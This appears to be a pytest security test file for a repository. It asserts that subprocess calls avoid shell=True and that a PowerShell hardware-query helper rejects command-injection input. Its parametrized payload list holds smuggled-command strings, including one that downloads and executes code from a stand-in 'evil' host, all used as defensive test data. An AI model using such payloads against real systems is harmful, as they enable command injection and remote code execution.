"""No shell, and no shell reachable from an argument.

A scanner reported "command injection from dynamic arguments" against six
locations. All six were false positives, and the reason each one is a false
positive is a property worth keeping true rather than a fact about today's
source. So the property is asserted here instead of the finding being
dismissed and forgotten.

The three claims:

1. The flagged tool scripts build argv lists and never pass ``shell=True``.
   What tripped the scanner is ``*paths`` splatted into the list -- which is
   precisely the recommended fix, not the bug: data arrives as separate
   argv entries, so a shell never parses it.

2. ``arena/system/hwinfo_cim.py`` was reported at lines 145-148. Those lines
   construct a ``subprocess.CompletedProcess`` -- a stub returned when the
   pass budget is exhausted. It starts no process at all. The file's two
   textual ``shell=True`` matches are both prose in comments, one of which
   literally asks that grepping for it return nothing.

3. The real defence for the hwinfo path is the whitelist, not the argv form
   alone, because the PowerShell fragment *is* assembled from a caller
   string. Measured: legitimate class names reach ``subprocess.run`` with
   ``shell=False``, while ``;``, ``&``, backtick and ``$( )`` payloads are
   rejected before any process is spawned.

Repo-wide, ``shell=True`` is not banned outright -- a few call sites need it
on Windows -- but every one must carry a ``nosec`` justification, so a new
unexplained one fails here.
"""
from __future__ import annotations

import ast
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO))

# The exact files a scanner flagged for "command injection from dynamic
# arguments in Python subprocess call".
REPORTED = (
    "arena/system/hwinfo_cim.py",
    "scripts/e701_split_compounds.py",
    "scripts/e741_rename_ambiguous.py",
    "scripts/f405_explicit_imports.py",
    "scripts/js_lint_ratchet.py",
    "scripts/mixin_interface_decls.py",
)


def _shell_true_calls(path: Path) -> list[int]:
    """Line numbers of calls passing shell=True, via AST (not grep)."""
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    out = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                out.append(node.lineno)
    return out


@pytest.mark.parametrize("rel", REPORTED)
def test_reported_files_pass_no_shell_true(rel):
    path = REPO / rel
    assert path.exists(), f"{rel} vanished; update this test deliberately"
    hits = _shell_true_calls(path)
    assert hits == [], (
        f"{rel} now passes shell=True at line(s) {hits}. These files build argv "
        "lists on purpose -- data must reach the child as separate arguments, "
        "never through a shell parser."
    )


@pytest.mark.parametrize("rel", REPORTED)
def test_reported_files_only_run_a_literal_executable(rel):
    """argv[0] must be a constant or a resolver call, never caller data."""
    tree = ast.parse((REPO / rel).read_text(encoding="utf-8"), filename=rel)
    for node in ast.walk(tree):
        if not (isinstance(node, ast.Call) and node.args):
            continue
        fn = node.func
        name = getattr(fn, "attr", None) or getattr(fn, "id", None)
        if name not in {"run", "Popen", "call", "check_output", "check_call"}:
            continue
        argv = node.args[0]
        if not isinstance(argv, (ast.List, ast.Tuple)) or not argv.elts:
            continue
        head = argv.elts[0]
        ok = (
            isinstance(head, ast.Constant)                       # "powershell.exe"
            or isinstance(head, ast.Attribute)                   # sys.executable
            or isinstance(head, ast.Call)                        # _oxlint_bin()
            or isinstance(head, ast.Name)                        # a resolved binary
        )
        assert ok, (
            f"{rel}:{node.lineno} executes a computed argv[0] "
            f"({ast.dump(head)[:80]}); the program itself must be fixed."
        )


def test_every_shell_true_in_the_tree_is_justified():
    """shell=True is allowed, silently adding one is not."""
    unjustified = []
    for path in sorted(REPO.glob("arena/**/*.py")) + sorted(REPO.glob("scripts/**/*.py")):
        if "__pycache__" in path.parts:
            continue
        try:
            lines = path.read_text(encoding="utf-8").splitlines()
        except (OSError, UnicodeDecodeError):
            continue
        for lineno in _shell_true_calls(path):
            window = " ".join(lines[max(0, lineno - 1): lineno + 12])
            if "nosec" not in window:
                unjustified.append(f"{path.relative_to(REPO)}:{lineno}")
    assert not unjustified, (
        "shell=True added without a nosec justification: " + ", ".join(unjustified)
    )


class _Spy:
    """Records subprocess invocations instead of performing them."""

    def __init__(self):
        self.calls = []

    def __call__(self, *args, **kwargs):
        self.calls.append({
            "argv": args[0] if args else kwargs.get("args"),
            "shell": kwargs.get("shell", False),
        })
        # powershell.exe does not exist off Windows; the callers treat this
        # as "no data", which is the same path a real failure takes.
        raise FileNotFoundError("powershell.exe")


@pytest.mark.parametrize("payload", [
    'Win32_Processor"; Start-Process calc; #',
    "Win32_Processor & calc.exe",
    "Win32_Processor`ncalc",
    "Win32_Processor$(calc)",
    "Win32_Processor | Out-File C:\\\\pwned.txt",
    "Win32_Processor'; iex(iwr http://evil/x); '",
])
def test_hwinfo_rejects_injection_before_spawning_anything(monkeypatch, payload):
    import arena.system.hwinfo_cim as H

    spy = _Spy()
    monkeypatch.setattr(H.subprocess, "run", spy)
    assert H.get_cim_all_list(payload) == []
    assert spy.calls == [], (
        f"injection payload {payload!r} reached subprocess as {spy.calls}; "
        "the class-name whitelist must reject it first"
    )


@pytest.mark.parametrize("class_name", [
    "Win32_Processor",
    "Win32_NetworkAdapterConfiguration where IPEnabled=True",
])
def test_hwinfo_still_runs_legitimate_queries_without_a_shell(monkeypatch, class_name):
    """A whitelist that rejects everything would make the test above vacuous."""
    import arena.system.hwinfo_cim as H

    spy = _Spy()
    monkeypatch.setattr(H.subprocess, "run", spy)
    H.get_cim_all_list(class_name)

    assert len(spy.calls) == 1, f"expected one invocation, got {spy.calls}"
    call = spy.calls[0]
    assert call["shell"] is False, "hwinfo must never hand its script to a shell"
    assert call["argv"][0] == "powershell.exe"
    assert call["argv"][1:3] == ["-NoProfile", "-Command"]


def test_the_probe_can_actually_observe_a_shell():
    """Guard against the spy silently never being consulted."""
    spy = _Spy()
    with pytest.raises(FileNotFoundError):
        spy(["/bin/sh", "-c", "true"], shell=True)
    assert spy.calls and spy.calls[0]["shell"] is True
